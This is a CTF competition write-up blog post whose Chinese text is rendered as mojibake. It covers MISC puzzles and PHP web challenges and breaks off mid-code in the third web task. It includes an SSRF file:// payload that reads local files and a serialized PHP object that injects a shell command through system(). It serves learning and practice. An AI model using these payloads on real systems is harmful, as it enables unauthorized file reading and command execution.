    <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Á¨¨ÂõõÂ±ä‰∏äÊµ∑ÁΩëÂÆâÊö®ÂÖ®ÂõΩÈÇÄËØ∑Ëµõ-ËµõÂêéÂ∞èÁªì"><a href="#Á¨¨ÂõõÂ±ä‰∏äÊµ∑ÁΩëÂÆâÊö®ÂÖ®ÂõΩÈÇÄËØ∑Ëµõ-ËµõÂêéÂ∞èÁªì" class="headerlink" title="Á¨¨ÂõõÂ±ä‰∏äÊµ∑ÁΩëÂÆâÊö®ÂÖ®ÂõΩÈÇÄËØ∑Ëµõ_ËµõÂêéÂ∞èÁªì"></a>Á¨¨ÂõõÂ±ä‰∏äÊµ∑ÁΩëÂÆâÊö®ÂÖ®ÂõΩÈÇÄËØ∑Ëµõ_ËµõÂêéÂ∞èÁªì</h1><blockquote><p>ÊâìÂÆåËøô‰∏™Á¨¨ÂõõÂ±ä‰∏äÊµ∑Â§ßÂ≠¶ÁîüÁΩëÁªúÂÆâÂÖ®Á´ûËµõÂêéÔºåÁÆÄÂçïÂÅö‰∏™Â∞èÁªìÔºåÂ∑©Âõ∫‰∏Ä‰∏ãüò≠„ÄÇ</p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Á≠æÂà∞BASE32"><a href="#Á≠æÂà∞BASE32" class="headerlink" title="Á≠æÂà∞BASE32"></a>Á≠æÂà∞BASE32</h3><blockquote><p>Á¨¨‰∏ÄÈÅìÈ¢òÊòØBASE32ÔºåÁ≠æÂà∞È¢òÔºåÈ£òËøá„ÄÇ</p></blockquote><h3 id="pycÂèçÁºñËØë"><a href="#pycÂèçÁºñËØë" class="headerlink" title="pycÂèçÁºñËØë"></a>pycÂèçÁºñËØë</h3><blockquote><p>Á¨¨‰∫åÈ¢òÊòØpythonÁöÑÂèçÁºñËØëÔºå‰∏Ä‰∏™pycÊñá‰ª∂„ÄÇ</p><p>ÂèØËÉΩÊàëÊòØÁ¢∞Â∑ßÂÅöÂá∫Êù•ÁöÑÔºåÈÄöËøáimportÂØºÂåÖÔºàimportÊòØ‰∏™Â•Ω‰∏úË•øÔºåpycÈÉΩËÉΩÂØºÔºâÔºåÂèØ‰ª•ÂæóÂà∞‰∏Ä‰∏™ÂàóË°®<code>[0,10,7,1,29,14,7,22,22,31,57,30,9,52,27]</code>ÔºåÊåâÂàóË°®È°∫Â∫è‰æùÊ¨°ÂØπ‚Äùf‚Äù,‚Äùl‚Äù,‚Äùa‚Äù,‚Äùg‚Äù,ÂºÇÊàñÂèØ‰ª•ÂæóÂà∞keyÂÄº‰∏∫102ÔºåÁÑ∂ÂêéÂØπÂàóË°®ËøõË°åÂºÇÊàñÊìç‰ΩúÂèØ‰ª•ÂæóÂà∞flag„ÄÇ</p><p>‰ΩÜÊòØÂ§ß‰Ω¨‰ª¨ÊòØÊÄé‰πàÂéªÂÅöËøôÈ¢òÁöÑÂë¢ÔºöÂèëÁé∞pycÊñá‰ª∂‰∏≠ÊúâÊÅ∂ÊÑèÊèíÂÖ•ÁöÑ‰∏ÄË°åÂ≠óËäÇÁ†ÅÔºåÊ≠£ÊòØÂõ†‰∏∫Ëøô‰∏™ÔºåÂØºËá¥pycÊó†Ê≥ïË¢´ÂèçÁºñËØëÔºåÂà†Èô§‰πãÂêéÂèçÁºñËØëÂèØ‰ª•ÂæóÂà∞Ôºö</p><pre class=" language-assembly"><code class="language-assembly">1       0  JUMP_ABSOLUTE         6  'to 6'           3             6  JUMP_ABSOLUTE         9  'to 9'           9  LOAD_CONST            0  ''          12  LOAD_CONST            1  10          15  LOAD_CONST            2  7          18  LOAD_CONST            3  1          21  LOAD_CONST            4  29          24  LOAD_CONST            5  14          27  LOAD_CONST            2  7          30  LOAD_CONST            6  22          33  LOAD_CONST            6  22          36  LOAD_CONST            7  31          39  LOAD_CONST            8  57          42  LOAD_CONST            9  30          45  LOAD_CONST           10  9          48  LOAD_CONST           11  52   2      51  LOAD_CONST           12  27          54  BUILD_LIST_15        15          57  STORE_NAME            0  'cmp'   3      60  LOAD_NAME             1  'raw_input'          63  CALL_FUNCTION_0       0   4      66  STORE_NAME            2  'flag'          69  LOAD_CONST            0  ''          72  STORE_NAME            3  'm'          75  SETUP_LOOP           91  'to 169'          78  LOAD_NAME             2  'flag'          81  GET_ITER          82  FOR_ITER             83  'to 168'          85  STORE_NAME            4  'i'          88  LOAD_NAME             5  'ord'          91  LOAD_NAME             4  'i'          94  CALL_FUNCTION_1       1          97  UNARY_INVERT          98  LOAD_CONST           13  102         101  BINARY_AND         102  LOAD_NAME             5  'ord'         105  LOAD_NAME             4  'i'         108  CALL_FUNCTION_1       1         111  LOAD_CONST           18  -103         114  BINARY_AND         115  BINARY_OR         116  STORE_NAME            4  'i'         119  LOAD_NAME             4  'i'         122  LOAD_NAME             0  'cmp'         125  LOAD_NAME             3  'm'         128  BINARY_SUBSCR         129  COMPARE_OP            2  '=='         132  POP_JUMP_IF_FALSE   144  'to 144'         135  LOAD_NAME             3  'm'   8     138  UNARY_NEGATIVE         139  LOAD_CONST           14  -1         142  BINARY_ADD         143  UNARY_NEGATIVE  10     144  STORE_NAME            3  'm'         147  JUMP_BACK            73  'to 73'         150  CONTINUE             73  'to 73'         153  LOAD_CONST           15  'wrong'         156  PRINT_ITEM         157  PRINT_NEWLINE_CONT         158  LOAD_NAME             6  'exit'         161  CALL_FUNCTION_0       0         164  POP_TOP         165  JUMP_BACK            73  'to 73'         168  POP_BLOCK       169_0  COME_FROM                '75'         169  LOAD_CONST           16  'right'         172  PRINT_ITEM         173  PRINT_NEWLINE_CONT</code></pre><p>ÂàÜÊûêÊ∏ÖÊ•öÈÄªËæë‰πãÂêéÂèØ‰ª•ÈÄÜÂá∫flag„ÄÇ</p></blockquote><h3 id="N0find"><a href="#N0find" class="headerlink" title="N0find"></a>N0find</h3><blockquote><p>Â§ßÊùÇÁÉ©ÔºåÈ¶ñÂÖàÈÄöËøáwiresharkÊèêÂèñÂá∫‰∏§Âº†ÂõæÁâáÔºàÂÆûÈôÖ‰∏äÊï∞ÊçÆÂåÖ‰∏≠ËøòËóèÁùÄ‰∏Ä‰∫õ‰∏ç‰∏∫‰∫∫Áü•ÁöÑ‰∏úË•øÔºâÔºåÂÖ∂‰∏≠‰∏ÄÂº†ÊòØÂÖ≥ÈîÆÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/ctfisfun.jpeg" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞Êúâ‰∏™<code>ct??????</code>ÔºåËé´ÈùûÊòØctf‰ªÄ‰πàÁöÑÔºåÂÖ≠‰∏™ÈóÆÂè∑ÔºåÂÖ´‰Ωç„ÄÇÔºàÂêéÈù¢ÂÆòÊñπÁªôÂá∫ÊèêÁ§∫ÔºåopenbuffÔºàÊüê‰∏Ä‰∏çÁü•ÈÅìÂì™‰∏™ËßíËêΩÁöÑÈöêÂÜôËΩØ‰ª∂ÔºâÔºåcrcÁ¢∞ÊíûÔºå‰ª•ÂèäÁ¢∞ÊíûÂá∫Êù•ÁöÑÂÄº‰∏≠Âê´ÊúâfÔºâ„ÄÇ</p><p>Ëøô‰∏™Êó∂ÂÄôÂ∞±ÊáµÈÄº‰∫ÜÔºåÊãø‰ªÄ‰πàÂéªcrcÁ¢∞ÊíûÔºåÁ¢∞ÊíûÂÆåÂèàËÉΩÂπ≤Âï•Ôºü</p><p>‰ªîÁªÜÁúãÁúãÊï∞ÊçÆÂåÖ‰∏≠ÔºåÂá∫Áé∞‰∫ÜcrcÂ≠óÁúºÔºåÂπ∂‰∏îÂê´Êúâ3‰∏™Áñë‰ººcrcÁöÑÂÄºÔºö</p><p><code>C61B1F65</code>,<code>E74E142D</code>,<code>648BDAD5</code></p><p>ÊãøcrcÁ¢∞ÊíûËÑöÊú¨ËøõË°åÁ¢∞ÊíûÂæóÂà∞‰∏âÁªÑ‰∏≠ÊØèÁªÑÂê´ÊúâfÁöÑÂÄºÔºö</p><p>1.<code>93fjhl    fBWjIv</code></p><p>2.<code>mbof3k      Xez1fW</code></p><p>3.<code>v4gfx1    5fyJIo</code></p><p>ÁÑ∂ÂêéÊãøopenbuffËøõË°åËß£ÂØÜÔºåÈúÄË¶Å‰∏â‰∏™ÂØÜÈí•Ôºå‰πüÂ∞±ÊòØ‰∏äÈù¢‰∏âÁªÑËøõË°åÊéíÂàóÁªÑÂêàÔºåËÄå‰∏îÂºÄÂ§¥ËøòÈúÄË¶ÅÂä†‰∏äctÔºåÂç≥ÂèØgetflag„ÄÇ</p></blockquote><h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><blockquote><p>emmmÊ≤°Âï•Â•ΩËØ¥ÁöÑÔºåËÄÉÁÇπÂ∞±ÊòØÂ≠óÁ¨¶‰∏≤ÂèçËΩ¨Ôºå‰ª•ÂèäÂØπÂ≠óÁ¨¶ÁöÑÊïèÊÑüÊÄßÔºåËøòÊúâÂØπbase92ÁöÑ‰∫ÜËß£ÔºåÈ¢òÁõÆÁªôÂá∫‰∫Ü92Âü∫Êú¨‰∏äÂèØ‰ª•Áü•ÈÅìbase92ËøôÁé©ÊÑèÂÑø‰∫ÜÔºåÂêéÈù¢ÁöÑÈöæÂ∫¶‰∏çÊòØÁâπÂà´Â§ßÔºåÈúÄË¶Å‰∏ÄÂÆöÁöÑÁÅµÊ¥ªÊÄß„ÄÇ</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><blockquote><p>ËøôÊ¨°ÁöÑwebÊÑüËßâÂÖ®ÊòØphpÔºåÊØîËæÉ‚ÄùÁ°¨Ê†∏‚Äù„ÄÇ</p></blockquote><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><blockquote><p>ÈÄöËøápost ‰º†admin=1Âπ∂‰∏îÁî®x-client-ip‰º™ÈÄ†Êú¨Âú∞ipÔºåÂç≥ÂèØÂà∞ËææÁî®urlÊâìssrfÁöÑÂú∞Ê≠•ÔºåÈÄöËøáÊåáÂÆöurlÔºåÊâìÂà∞ÁöÑÂÜÖÂÆπ‰ºö‰ª•ÂõæÁâáÊ†ºÂºèÂ≠òÂÇ®Âà∞downloadÁõÆÂΩï„ÄÇ</p><p>ËøôÈáåÈúÄË¶ÅÁî® fileÂçèËÆÆÔºåËÄå‰∏çÊòØhttpÂçèËÆÆ„ÄÇ</p><p>Â§ß‰Ω¨ÊòØËøôÊ†∑ÊûÑÈÄ†urlÁöÑÔºö</p><p><code>url=file://@127.0.0.1:80@www.ichunqiu.com/./..//var/www/html/flag.php</code></p><p>ËÄåÊàëÔºö</p><p><code>url=file://www.ichunqiu.com/var/www/html/flag.php</code></p><p>ÂèØËÉΩÂèàÊòØÁ¢∞Â∑ßÊâìÂà∞ÁöÑÔºüÊàë‰ª¨ÂèØ‰ª•Ëé∑Âæósource.phpÁöÑÊ∫êÁ†ÅÔºö</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"you need to login as admin!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;!-- post param  'admin' -->"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'www.ichunqiu.com'</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'download/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">';img1.jpg'</span><span class="token punctuation">;</span>                <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$img</span><span class="token operator">=</span><span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> "you need post url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.ichunqiu.com";</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"only 127.0.0.1 can get the flag!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>ÂÆûÈôÖ‰∏äËÄÉÁöÑÊòØ<code>libcurl</code>and<code>parse_url()</code>Ëß£ÊûêÈóÆÈ¢ò„ÄÇ</p><p>ËøôÈáåÂèØ‰ª•ÂèÇËÄÉ<a href="http://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">‰∏ÄÂè∂È£òÈõ∂Â∏àÂÇÖ</a>/)ÂÜôÁöÑ‰∏ÄÁØáÂçöÊñá„ÄÇ</p></blockquote><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><blockquote><p>Êâ´ÁõÆÂΩïÂæóswp‰∫§Êç¢Êñá‰ª∂==&gt;vimÊÅ¢Â§çÊñá‰ª∂==&gt;ÂæóÂà∞index.phpÊ∫êÁ†ÅÔºö</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">come</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[&lt;>*;|?\n ]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>               <span class="token keyword">function</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo $host"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$first</span><span class="token operator">=</span><span class="token string">'hi'</span><span class="token punctuation">;</span><span class="token variable">$var</span><span class="token operator">=</span><span class="token string">'var'</span><span class="token punctuation">;</span><span class="token variable">$bbb</span><span class="token operator">=</span><span class="token string">'bbb'</span><span class="token punctuation">;</span><span class="token variable">$ccc</span><span class="token operator">=</span><span class="token string">'ccc'</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>            $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token operator">===</span><span class="token string">"doller"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token operator">===</span><span class="token string">"give"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$bbb</span><span class="token operator">===</span><span class="token string">"me"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token operator">===</span><span class="token string">"flag"</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br>welcome!&lt;br>"</span><span class="token punctuation">;</span>                <span class="token variable">$come</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'come'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$come</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>think about it&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"NO"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Can you hack me?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>ËøôÊòØ‰∏Ä‰∏™ÂÖ≥ÈîÆÁÇπ‰∏∫ÂèçÂ∫èÂàóÂåñÁöÑÈóÆÈ¢òÔºåÊàë‰ª¨ÂèØ‰ª•ÂÖàÊûÑÈÄ†getÂèÇÊï∞ÁªïËøáÂâçÈù¢ÁöÑÊ£ÄÊµãÔºåÊù•Âà∞postÂèÇÊï∞Â§Ñ„ÄÇ</p><p>ÊûÑÈÄ†getÂèÇÊï∞:<code>?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code>,ÈÄöËøáparse_strË¶ÜÁõñÂéüÊúâÂèòÈáèÂç≥ÂèØ„ÄÇ</p><p>ÁÑ∂ÂêéËøôÈ¢òÂπ∂‰∏çÊòØÁªïËøáwakeupÔºåÂõ†‰∏∫Âú®Êñ∞Áâàphp‰∏≠Â∑≤Áªè‰øÆÂ§çËøô‰∏™ÈóÆÈ¢òÔºåÊàë‰ª¨Ë¶ÅÂú®echo($host)Â§ÑÊ≥®ÂÖ•ÂëΩ‰ª§ÊâßË°åÔºåÊâÄ‰ª•ËøòÊòØÈúÄË¶ÅËßÑËßÑÁü©Áü©Âú∞ËøõË°åÁªïËøáËøáÊª§ÔºåÂ∞ÜÊûÑÈÄ†ÁöÑcome PostËøáÂéªÔºö</p><p><code>come==O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3B%3A1%3A%7Bi%3A0%3Bs%3A23%3A%22aaa%26%26cat%24IFS%22%2Fflflagag%22%22%3B%7D%7D</code></p><p>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØ‰∏çÁî®Á©∫Ê†ºÊâßË°åÂëΩ‰ª§Ôºà <a href="https://www.cnblogs.com/sevck/p/6072721.html" target="_blank" rel="noopener">ÂèÇËÄÉÈìæÊé• </a>ÔºâÔºå‰ª•ÂèäÂèçÂ∫èÂàóÂåñ‰∏≠ÁßÅÊúâÂèòÈáèÁöÑ%00ÈóÆÈ¢òÔºåÂ¶ÇÊûú‰∏ç‰ª•urlÁºñÁ†ÅÂΩ¢ÂºèÔºå%00Âπ∂‰∏ç‰ºöËµ∑‰ΩúÁî®„ÄÇ</p></blockquote><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><blockquote><p>ËôΩÁÑ∂Ê≤°ÂÅöÂá∫Êù•üò≠Ôºå‰ΩÜËøòÊòØË¶ÅÂ≠¶‰π†‰∏Ä‰∏ãÁöÑ„ÄÇ</p><p>ÂèàÊòØphpÁöÑ‰ª£Á†ÅÂÆ°ËÆ°È¢ò„ÄÇ</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//error_reporting(0);</span>    <span class="token comment" spellcheck="true">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span>    <span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"icq"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/sandbox/'</span> <span class="token punctuation">.</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token operator">==</span><span class="token variable">$filename</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"emmmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$new_name</span> <span class="token operator">=</span> 